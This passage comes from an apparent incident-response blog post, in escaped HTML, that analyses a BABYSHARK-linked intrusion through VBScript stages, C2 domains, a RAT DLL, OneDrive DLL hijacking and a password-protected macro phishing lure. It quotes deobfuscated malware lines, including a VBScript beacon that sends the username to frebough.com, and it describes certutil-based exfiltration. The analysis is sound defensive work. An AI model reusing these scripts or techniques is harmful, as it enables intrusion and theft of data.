src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2664cdbe2f6c4733ab571699ec771e46\\\" alt=\\\"image13\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e(Click the above image to enlarge it)\u003c/p\u003e\u003cp\u003eThe \u003cspan class=\\\"highlight\\\"\u003efilexx.tmp\u003c/span\u003e and \u003cspan class=\\\"highlight\\\"\u003eschedxx.tmp\u003c/span\u003e files were written to disk as means of checking if this code was executed previously. These files were not present on Alex's machine at the time of our analysis.\u003c/p\u003e\u003cp\u003eThe registry value at \\\"\u003cspan class=\\\"highlight\\\"\u003eHKEY_CURRENT_USER\\\\Software\\\\RegisteredApplications\\\\AppXr1bysyqf6kpaq1aje5sbadka8dgx3g4g\u003c/span\u003e\\\" contained \u003ca href=\\\"https://gist.github.com/JohnHammond/7b619e5baaf8e25bad652dd27bb826a3\\\" target=\\\"_blank\\\"\u003eeven more VBScript code\u003c/a\u003e.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1205px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1205px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F336ac3da8a874c41b971957254754123\\\" alt=\\\"image (5)\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThis code reached out to a C2 domain to retrieve the contents for yet another new file, \u003cspan class=\\\"highlight\\\"\u003edesktop.tmp\u003c/span\u003e, if it was not already present. This code is exactly in line with what we uncovered from the \u003cspan class=\\\"highlight\\\"\u003enormal.crp\u003c/span\u003e, but it pulls from a different C2 domain (\u003cspan class=\\\"highlight\\\"\u003eworldinfocontact[.]club\u003c/span\u003e rather than \u003cspan class=\\\"highlight\\\"\u003ehodbeast[.]com\u003c/span\u003e).\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe distinction between these domains seemed to be that \u003cspan class=\\\"highlight\\\"\u003eworldinfocontact[.]club \u003c/span\u003eis their \u003cem\u003ebeaconing\u003c/em\u003e command and control. It reached out to this C2 on a set interval, retrieved any pending commands to be executed, slept, then executed those new tasks. The response from \u003cspan class=\\\"highlight\\\"\u003eworldinfocontact[.]club /111/alex/expres[.]php?op=2\u003c/span\u003e was inherently going to vary from time to time as the threat actors queued new commands and scripts to execute remotely.\u003c/p\u003e\u003cp\u003eThe contents of desktop.tmp were then subsequently changing as they were the last set of commands sent by the C2 server.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe \u003cspan class=\\\"highlight\\\"\u003edesktop.tmp\u003c/span\u003e file contents we uncovered on Alex's machine were obfuscated commands to run the OneDrive.exe process. It is fair to say that this is the “fallback” procedure from the C2 (when no other commands were pending) to ensure whatever DLL hijacking they set up would continue to execute, even if the OneDrive process was stopped. We will revisit the alleged DLL hijacking technique in our analysis of other artifacts soon.\u003c/p\u003e\u003cp\u003eThis deobfuscated \u003cspan class=\\\"highlight\\\"\u003edesktop.tmp\u003c/span\u003e on Alex's host is below:\u003c/p\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003eOn Error Resume Next:Set wShell=CreateObject(\\\"WScript.Shell\\\"):retu=wShell.run(\\\"\\\"\\\"%userprofile%\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\onedrive.exe\\\"\\\" /background\\\",0,false)\u003c/span\u003e\u003c/p\u003e\u003cp\u003eBear in mind that this was returned from the \u003cspan class=\\\"highlight\\\"\u003eworldinfocontact[.]club\u003c/span\u003e endpoint. However, \u003cspan class=\\\"highlight\\\"\u003ehodbeast[.]com\u003c/span\u003e, on the other hand, returned obfuscated syntax that would ultimately run some enumeration commands and write the output to a file \u003cspan class=\\\"highlight\\\"\u003ettmp1.log\u003c/span\u003e.\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cspan class=\\\"highlight\\\"\u003ecmd.exe /c PowerShell Get-Process outlook ^| Format-List Path\u0026nbsp;\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan class=\\\"highlight\\\"\u003ecmd.exe /c whoami\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan class=\\\"highlight\\\"\u003ecmd.exe /c net user\u003c/span\u003e\u003c/li\u003e\u003cli\u003e\u003cspan class=\\\"highlight\\\"\u003etasklist\u003c/span\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThe \u003cspan class=\\\"highlight\\\"\u003ettmp1.log\u003c/span\u003e file is then Base64 encoded with \u003cspan class=\\\"highlight\\\"\u003ecertutil -f -encode\u003c/span\u003e to be saved as \u003cspan class=\\\"highlight\\\"\u003ettmp.log\u003c/span\u003e and then uploaded to \u003cspan class=\\\"highlight\\\"\u003ehttps[:]//hodbeast.com/silver/upload[.]php\u003c/span\u003e with a POST request.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eThis data exfiltration technique is in line with \u003c/strong\u003e\u003ca href=\\\"https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf\\\" target=\\\"_blank\\\"\u003e\u003cstrong\u003eprevious sightings\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e and is known in \u003c/strong\u003e\u003ca href=\\\"https://attack.mitre.org/software/S0414/\\\" target=\\\"_blank\\\"\u003e\u003cstrong\u003ethe MITRE ATT\u0026amp;CK page for BABYSHARK\u003c/strong\u003e\u003c/a\u003e\u003cstrong\u003e malware.\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eFinally, other files present on Alex's machine were \u003ca href=\\\"https://gist.github.com/JohnHammond/acd830ff6342bc027fadb3217ab08b79\\\" target=\\\"_blank\\\"\u003e\u003cstrong\u003edesktop.r5u\u003c/strong\u003e and \u003cstrong\u003edesktop.xml\u003c/strong\u003e\u003c/a\u003e. These files had identical contents. The “\u003cstrong\u003eBEGIN\u003c/strong\u003e” and “\u003cstrong\u003eEND\u003c/strong\u003e” certificate delimiters indicate this file would also be unraveled with \u003cstrong\u003ecertutil\u003c/strong\u003e.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:454px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"454px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F804de195e9654397956ab040472f85e2\\\" alt=\\\"image23\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003edesktop.r5u and \u003cspan class=\\\"highlight\\\"\u003edesktop.xml\u003c/span\u003e decode to a RAT.\u003c/p\u003e\u003cp\u003eLooking at the first few characters (\u003cspan class=\\\"highlight\\\"\u003e\u003cstrong\u003e]TVqQAA\u003c/strong\u003e\u003c/span\u003e) we can see that this is probably a base64 encoded PE file.\u0026nbsp; Indeed, using CyberChef, we can decode the base64 text to obtain a DLL file.\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1532px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1532px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fab7aa00600e7474088368825fe5e839a\\\" alt=\\\"image11\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eLoading the DLL in \u003cspan class=\\\"highlight\\\"\u003epestudio\u003c/span\u003e reveals a pdb path that leaves nothing to the imagination: “\u003cspan class=\\\"highlight\\\"\u003eH:\\\\Hollow\\\\googleDrive_rat_load_complete\\\\rat_load\\\\Release\\\\rat_load.pdb\u003c/span\u003e”\u003c/p\u003e\u003cp\u003eIt’s worth noting that this file cannot be found in VirusTotal. While we have not yet finished our analysis on this DLL, it is not a stretch to consider this could be \u003ca href=\\\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\\\" target=\\\"_blank\\\"\u003ea variant of the KimJongRAT known to be often used alongside BABYSHARK\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eThe \u003cspan class=\\\"highlight\\\"\u003edesktop.xml\u003c/span\u003e file seems to copy itself to (or possibly check for) \u003cspan class=\\\"highlight\\\"\u003edesktop.r5u\u003c/span\u003e file in \u003cspan class=\\\"highlight\\\"\u003e%appdata\\\\roaming\\\\Microsoft%\u003c/span\u003e directory as this can be found hardcoded in the binary.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:639px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"639px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F34a9ec1ae24c40c9a8415442b6cc5232\\\" alt=\\\"image28\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eIt also contains references to the following DLLs within an embedded PE file:\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-center\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"center\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0c79388d36bd4f51984be694c692f613\\\" alt=\\\"image21\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThe exports from this binary are as follows:\u0026nbsp;\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1210px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1210px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F16edff58f34b4c15b8dbb543b44e3c65\\\" alt=\\\"image29\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eIf there weren’t already enough moving pieces to this story, we uncovered even more activity through \u003cspan class=\\\"highlight\\\"\u003ewscript.exe\u003c/span\u003e with our Process Insights capability. Alongside the running scheduled tasks, there was an occurrence of a script CF8C.vbs being run out of Alex's temporary directory.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003ewscript.exe C:\\\\Users\\\\Alex\\\\AppData\\\\Local\\\\Temp\\\\CF8C.vbs \u003cem\u003e[MoreVBScript]\u003c/em\u003e\u003c/span\u003e\u003c/p\u003e\u003cp\u003eThis \u003cspan class=\\\"highlight\\\"\u003eCF8C.vbs\u003c/span\u003e file was no longer present on the host, but considering it had practically the contents of another script passed as another argument, it was clear it would again deobfuscate or substitute symbols and execute more VBScript.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1089px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1089px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fc8ac1dfff8a640a69ef567512de67d8e\\\" alt=\\\"image (4) copy\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\\\"https://gist.github.com/JohnHammond/b450d9efe00c80bbe85b3a05d72d74f3\\\" target=\\\"_blank\\\"\u003eThis deobfuscated VBScript\u003c/a\u003e reaches out to a OneDrive link, a tactic once again referenced in other public research, then deobfuscates and executes the supplied VBScript.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1078px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1078px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Feb9c76e70e634faea41e7edb326cd3ac\\\" alt=\\\"image27\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003ca href=\\\"https://gist.github.com/JohnHammond/6f55e4d18951f941e11a172a1db40971\\\" target=\\\"_blank\\\"\u003eThis decodes to...\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003eOn Error Resume Next:Set fs = CreateObject(\\\"Scripting.FileSystemObject\\\"):Set ws=CreateObject(\\\"WScript.Shell\\\"):Set p0 = CreateObject(\\\"msxml2.xmlhttp\\\"):scriptdir = ws.ExpandEnvironmentStrings(\\\"%appdata%\\\"):userdir = ws.ExpandEnvironmentStrings(\\\"%userprofile%\\\"):username = lcase(ws.ExpandEnvironmentStrings(\\\"%username%\\\")):username=Escape(username):username=Replace(username,\\\"%u\\\",\\\"\\\"):chk=\\\"no\\\":username=lcase(username):p0.open \\\"GET\\\", \\\"https://frebough.com/onedrive/winmm.php?op=\\\" +username,false:p0.setRequestHeader \\\"Content-Type\\\", \\\"application/x-www-form-urlencoded\\\":p0.Send\u003c/span\u003e\u003c/p\u003e\u003cp\u003ePresumably, this is to tell yet another C2 server that this step is completed. It does not seem to execute more code from the response.\u003c/p\u003e\u003ch2\u003eAdditional Artifacts\u003c/h2\u003e\u003cp\u003eAlongside the \u003cspan class=\\\"highlight\\\"\u003eqwert.vbs\u003c/span\u003e file we found on Alex’s host, we uncovered multiple other strange files.\u003c/p\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003er.vbs\u003c/span\u003e seemed to kill the \u003cspan class=\\\"highlight\\\"\u003eOneDrive.exe \u003c/span\u003eprocess, wait three seconds, and remove a \u003cspan class=\\\"highlight\\\"\u003eversion.dll\u003c/span\u003e file present in the same directory as the OneDrive executable. Then, five seconds later, it runs the \u003cspan class=\\\"highlight\\\"\u003eOneDrive.exe\u003c/span\u003e process once more.\u003c/p\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003eOn Error Resume Next\u003cbr\u003eSet wShell=CreateObject(\\\"WScript.Shell\\\")\u003cbr\u003eretu=wShell.run(\\\"cmd.exe /c taskkill /im onedrive.exe /f \u0026amp; timeout 3\u0026amp; del \\\"\\\"%userprofile%\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\version.dll\\\"\\\"\\\",0,true)\u003cbr\u003eretu=wShell.run(\\\"cmd.exe /c timeout 5\\\",0,true)\u003cbr\u003eretu=wShell.run(\\\"\\\"\\\"%userprofile%\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\onedrive.exe\\\"\\\" /background\\\",0,false)\u003c/span\u003e\u003c/p\u003e\u003cp\u003eUnfortunately we were unable to find the \u003cspan class=\\\"highlight\\\"\u003eversion.dll\u003c/span\u003e file on Alex's host or any other affected machines. Considering the file placement, this looks to be a \u003ca href=\\\"https://packetstormsecurity.com/files/158380/Microsoft-OneDrive-19.232.1124.0010-DLL-Hijacking.html#:~:text=A%20file%20hijacking%20vulnerability%20was,the%20privileges%20of%20the%20victim.\\\" target=\\\"_blank\\\"\u003eknown DLL hijacking technique\u003c/a\u003e to run additional code.\u003c/p\u003e\u003cp\u003eConsidering this script removes the \u003cspan class=\\\"highlight\\\"\u003eversion.dll\u003c/span\u003e file, once again runs OneDrive with normal execution, and the slight filename “r.vbs” perhaps this is a mechanism to “remove” another implant. We later discovered this same code on Bob’s machine under the filename 1.vbs.\u003c/p\u003e\u003cp\u003eAdditionally, a \u003ca href=\\\"https://gist.github.com/JohnHammond/d017e8d3f83093f48bb7188fefa79b00\\\" target=\\\"_blank\\\"\u003edev.ps1 file was found\u003c/a\u003e on the affected host. This used inline C# code within PowerShell to seemingly track Google Chrome and Microsoft Edge tabs, monitor the use of Browser Developer Tools and log these to a \u003cspan class=\\\"highlight\\\"\u003etabid_chrome.log, tabid_edge.log\u003c/span\u003e\u0026nbsp;and a \u003cspan class=\\\"highlight\\\"\u003eliving.log\u003c/span\u003e file that was updated the current date and time. These log files contained nothing more than an identification number for each tab, but we could see from the \u003cspan class=\\\"highlight\\\"\u003eliving.log\u003c/span\u003e file that this code was \u003cem\u003eactively\u003c/em\u003e running on the victim.\u003c/p\u003e\u003cp\u003e(We later discovered \u003cspan class=\\\"highlight\\\"\u003e\u003ca href=\\\"https://gist.github.com/JohnHammond/4b356fe54d57e0be513b71ebdeca3895\\\" target=\\\"_blank\\\"\u003edev.vbs\u003c/a\u003e\u003c/span\u003e\u003ca href=\\\"https://gist.github.com/JohnHammond/4b356fe54d57e0be513b71ebdeca3895\\\" target=\\\"_blank\\\"\u003e on Bob’s machine\u003c/a\u003e which looks to kickstart the \u003cspan class=\\\"highlight\\\"\u003edev.ps1\u003c/span\u003e file—also present with the same contents under the filename \u003cspan class=\\\"highlight\\\"\u003eonenote.vbs\u003c/span\u003e.)\u003c/p\u003e\u003cp\u003eOn a separate user’s machine (we will call them Charlie for the sake of storytelling) we discovered the \u003cspan class=\\\"highlight\\\"\u003eonenote.vbs\u003c/span\u003e file with \u003ca href=\\\"https://gist.github.com/JohnHammond/24cd52c14a50c5f48437931e3bfe973e\\\" target=\\\"_blank\\\"\u003eslightly different contents\u003c/a\u003e to invoke the PowerShell script with a different technique, as well as \u003ca href=\\\"https://gist.github.com/JohnHammond/4f4bcb04743fa5c911066084182a47cd\\\" target=\\\"_blank\\\"\u003ea new \u003cspan class=\\\"highlight\\\"\u003epow.ps1\u003c/span\u003e\u003c/a\u003e that looked to remove Google Chrome security preferences.\u003c/p\u003e\u003ch2\u003ePutting the Puzzle Pieces Together\u003c/h2\u003e\u003cp\u003eWhile we continued to do analysis on the files and threads we uncovered, we knew we were slowly building the big picture of this attack chain. Considering how BABYSHARK malware would traditionally be run, we knew we were still missing one critical piece of information: the initial access where this all started from. \u003cstrong\u003eWhere was the phish?\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eThe first step in finding initial access was to figure out the timeframe of the compromise. To do that, we searched for other interesting files on the machines. The earliest found script file was the \u003cspan class=\\\"highlight\\\"\u003esys0.vbs\u003c/span\u003e script we found earlier. The timestamps for this file placed our timeline starting on March 9, 2021. This helped us narrow down the timeframe from when the malicious document(s) may have been downloaded.\u003c/p\u003e\u003cp\u003eThe APT group is known to use spear phishing emails with malicious links embedded or malicious documents attached to gain access, so we started hunting for them on the system. Being extremely cautious of what we could dig through, we examined only suspicious Microsoft Office during the early months of 2021. \u003c/p\u003e\u003cp\u003eUnfortunately, we couldn’t find a smoking gun. But at that time, only Alex's computer was online and communicating with Huntress.\u003c/p\u003e\u003cp\u003eAs we communicated with this trialing partner, explaining what we uncovered and the gravity of this incident, they notified the players involved. Soon enough, the other compromised machines (Bob's and Charlie's, specifically) came online.\u003c/p\u003e\u003cp\u003eWith those hosts now accessible to Huntress, we could correlate what files were present across \u003cem\u003eall\u003c/em\u003e of these compromised machines. While the AV product the organization was using did not \u003cem\u003estop\u003c/em\u003e the intrusion, it at the very least had \u003cem\u003elogs\u003c/em\u003e of what files were scanned and when.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1200px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1200px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Facbfb042f1d94e76b18c3a8fa8230477\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eUsing the logs across all three hosts, we uncovered only a handful of files that were present on each host. The most interesting file that stuck out to us was \u003cspan class=\\\"highlight\\\"\u003eVOA_Korea.zip\u003c/span\u003e. From the logs, we could tell it had a \u003cspan class=\\\"highlight\\\"\u003e\u003cstrong\u003e.\u003c/strong\u003edoc \u003c/span\u003efile inside of it, and this seemed promising. We also noticed that the scanning of the ZIP file and its contents failed. This could be indicative of password protection.\u003c/p\u003e\u003cp\u003eIf you hadn’t caught on to the acronym, the VOA in this case refers to the Voice of America media organization. Voice of America is an international broadcasting station in the United States, focusing on offering information and news from countries and continents all over the world.\u003c/p\u003e\u003cp\u003eAttempting to retrieve the \u003cspan class=\\\"highlight\\\"\u003eVOA_Korea.zip \u003c/span\u003efile, it was unfortunately no longer present on each of the compromised machines. \u003c/p\u003e\u003cp\u003eAV logs revealed that the end user attempted to download this file two times.\u003c/p\u003e\u003ch2\u003eFinding the Phish\u003c/h2\u003e\u003cp\u003eThere was still a \u003cspan class=\\\"highlight\\\"\u003eVOA_Korea (1).zip\u003c/span\u003e that was present and we were able to retrieve the file. Uncompressing the archive, we hit another wall—the \u003cspan class=\\\"highlight\\\"\u003e.doc\u003c/span\u003e file was password protected. This doubles as both a sneaky phishing tactic, but also to potentially hide malicious macros from antivirus software.\u003c/p\u003e\u003cp\u003eIt was at this point that we went from \u003cem\u003ehunting\u003c/em\u003e to \u003cem\u003ehacking \u003c/em\u003eand started trying to crack open the file. We do say \u003cem\u003eour offense is your defense\u003c/em\u003e, after all! 😉\u003c/p\u003e\u003cp\u003eAfter throwing combinations of John The Ripper and Hashcat with different wordlists and rule files, eventually, a boring, basic bruteforce found the password: \u003cspan class=\\\"highlight\\\"\u003evoa2021\u003c/span\u003e.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:869px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"869px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eWith a rush of adrenaline, we went to examine the decrypted Microsoft Word document, opting for the one of quickest tools for macro analysis, \u003cstrong\u003eolevba\u003c/strong\u003e. \u003c/p\u003e\u003cp\u003eThe .doc file lit up like a Christmas tree.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:714px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"714px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eWe found the malicious macro document used for initial access! After \u003ca href=\\\"https://gist.github.com/JohnHammond/070af94c211536109642feff1fbc950e\\\" target=\\\"_blank\\\"\u003esome quick deobfuscating\u003c/a\u003e (same technique as seen previously), we could see the whole picture for this attack.\u003c/p\u003e\u003cp\u003eThis macro tells the story for almost each of the puzzle pieces we had uncovered previously.\u003c/p\u003e\u003cul\u003e\u003cli\u003eChecks for the presence of OneDrive\u003c/li\u003e\u003cli\u003eDownloads a new Microsoft Word document to show the user and convince them of the phish: (\u003cspan class=\\\"highlight\\\"\u003ehttp[:]//beastmodser.club/sil/0304/VOA_Korea[.]docx\u003c/span\u003e)\u003c/li\u003e\u003cli\u003eChecks for the presence of antivirus products like BitDefender or Norton Security, and quits if present\u003c/li\u003e\u003cli\u003eDisables Microsoft Word macro protections in registry\u003c/li\u003e\u003cli\u003eDownloads a \u003cspan class=\\\"highlight\\\"\u003eversion.tmp\u003c/span\u003e file to be then moved and renamed as version.dll for the OneDrive DLL hijacking attack (\u003cspan class=\\\"highlight\\\"\u003ehttps[:]//beastmodser.club/sil/0304/d[.]php?na=version.gif\u003c/span\u003e)\u003c/li\u003e\u003cli\u003eStarts \u003cspan class=\\\"highlight\\\"\u003eOneDriveStandaloneUpdater.exe\u003c/span\u003e to begin the DLL hijacking attack\u003c/li\u003e\u003c/ul\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1200px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1200px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eChecking for the presence of antivirus or security software is a common technique for sophisticated malware samples, but this adds to the stealth of the operation. The malicious macro bailing out and not detonating if there are certain products present makes this even more targeted.\u003c/p\u003e\u003cp\u003eWhile this explained the \u003cspan class=\\\"highlight\\\"\u003eversion.dll\u003c/span\u003e, unfortunately, we were unable to retrieve the original file from the malicious hosting URL. Neither the faked \u003cspan class=\\\"highlight\\\"\u003eVOA_Korea.docx\u003c/span\u003e file or the DLL were still present on the newfound \u003cspan class=\\\"highlight\\\"\u003ebeastmodser[.]club\u003c/span\u003e domain… but it is at least known evil. 😉\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:844px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"844px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eOther reports on BABYSHARK malware have explained how it does disable macro warnings and Microsoft Office security protections. This was very evident in the code run by the macro…changing registry values to disable defense across practically every version of Microsoft Word. \u003c/p\u003e\u003cp\u003eA quick synopsis of the commands ran within that macro: \u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1200px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1200px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003ch2\u003eLures and Phishbait\u003c/h2\u003e\u003cp\u003eWith the discovery of the initial attack vector and phishing document, and after analysis of the pertinent files to determine the scope of this attack, we felt this investigation was coming to a close. But even after finding the malicious macro, we were still curious—what convinced Alex to open this file?\u003c/p\u003e\u003cp\u003eThe “lure” looked safe and secure, tucked away inside of a ZIP file with a password-protected document… what was the pretense?\u003c/p\u003e\u003cp\u003eWe asked the trialing partner if they could find the original email. Here we showcase a fascinating back-and-forth with some cunning deception and a well-played scheme.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1200px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1200px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThe threat actor reaches out to Alex under the guise of collecting info for the VOA, masquerading as a real VOA author (that author link is legitimate, along with the Twitter profile). There is no attachment—they \u003cem\u003eask\u003c/em\u003e for input from the victim.\u003c/p\u003e\u003cp\u003eAlex falls for the bait, but there is at least one clue that suggests this may have originated from an illegitimate source:\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1041px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" 